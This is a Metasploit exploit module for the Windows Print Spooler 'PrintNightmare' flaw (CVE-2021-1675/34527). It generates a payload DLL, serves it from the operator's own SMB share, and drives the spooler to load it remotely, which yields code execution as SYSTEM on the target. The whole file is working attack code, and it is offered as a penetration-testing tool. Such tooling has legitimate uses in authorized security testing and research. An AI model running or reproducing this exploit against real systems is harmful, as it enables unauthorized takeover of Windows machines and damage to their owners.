##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::DCERPC
  include Msf::Exploit::Remote::SMB::Client::Authenticated
  include Msf::Exploit::Remote::SMB::Server::Share
  include Msf::Exploit::EXE

  # this is the real module, all we're doing here is wrapping it to generate and serve a payload
  MODULE = 'auxiliary/admin/dcerpc/cve_2021_1675_printnightmare'.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Print Spooler Remote DLL Injection',
        'Description' => %q{
          The print spooler service can be abused by an authenticated remote attacker to load a DLL through a crafted
          DCERPC request, resulting in remote code execution as NT AUTHORITY\SYSTEM. This module uses the MS-RPRN
          vector which requires the Print Spooler service to be running.
        },
        'Author' => [
          'Zhiniang Peng',           # vulnerability discovery / research
          'Xuefeng Li',              # vulnerability discovery / research
          'Zhipeng Huo',             # vulnerability discovery
          'Piotr Madej',             # vulnerability discovery
          'Zhang Yunhai',            # vulnerability discovery
          'cube0x0',                 # PoC
          'Spencer McIntyre',        # metasploit module
          'Christophe De La Fuente', # metasploit module co-author
        ],
        'License' => MSF_LICENSE,
        'DefaultOptions' => {
          'SRVHOST' => Rex::Socket.source_address,
          'CheckModule' => 'auxiliary/admin/dcerpc/cve_2021_1675_printnightmare'
        },
        'Stance' => Msf::Exploit::Stance::Aggressive,
        'Targets' => [
          [
            'Windows', {
              'Platform' => 'win',
              'Arch' => [ ARCH_X64, ARCH_X86 ]
            },
          ],
        ],
        'References' => [
          ['CVE', '2021-1675'],
          ['CVE', '2021-34527'],
          ['URL', 'https://github.com/cube0x0/CVE-2021-1675'],
          ['URL', 'https://web.archive.org/web/20210701042336/https://github.com/afwu/PrintNightmare'],
          ['URL', 'https://github.com/calebstewart/CVE-2021-1675/blob/main/CVE-2021-1675.ps1'],
          ['URL', 'https://github.com/byt3bl33d3r/ItWasAllADream']
        ],
        'DisclosureDate' => '2021-06-08',
        'Notes' => {
          'AKA' => [ 'PrintNightmare' ],
          'Stability' => [CRASH_SERVICE_DOWN],
          'Reliability' => [UNRELIABLE_SESSION],
          'SideEffects' => [
            ARTIFACTS_ON_DISK # the dll will be copied to the remote server
          ],
          'RelatedModules' => [MODULE]
        }
      )
    )
  end

  def check
    # Instantiate the module
    mod = framework.modules.create(MODULE)

    # Bail if we couldn't
    return Exploit::CheckCode::Unsupported("Could not instantiate #{MODULE}.") unless mod

    print_status("Using #{MODULE} as check")

    # Retrieve the module's return value
    mod.check_simple(
      'LocalInput' => user_input,
      'LocalOutput' => user_output,
      'Options' => datastore.merge(forward_options)
    )
  end

  def forward_options
    { 'DLL_PATH' => unc }
  end

  def setup
    if Rex::Socket.is_ip_addr?(datastore['SRVHOST']) && Rex::Socket.addr_atoi(datastore['SRVHOST']) == 0
      fail_with(Exploit::Failure::BadConfig, 'The SRVHOST option must be set to a routable IP address.')
    end

    super

    file_name << '.dll'
  end

  def primer
    self.file_contents = generate_payload_dll

    # Instantiate the module
    mod = framework.modules.create(MODULE)

    # Bail if we couldn't
    fail_with(Failure::Unknown, "Could not instantiate #{MODULE}.") unless mod

    print_status("Using #{MODULE} as exploit")

    # Retrieve the module's return value
    mod.run_simple(
      'LocalInput' => user_input,
      'LocalOutput' => user_output,
      'Options' => datastore.merge(forward_options)
    )

    cleanup_service
  end
end
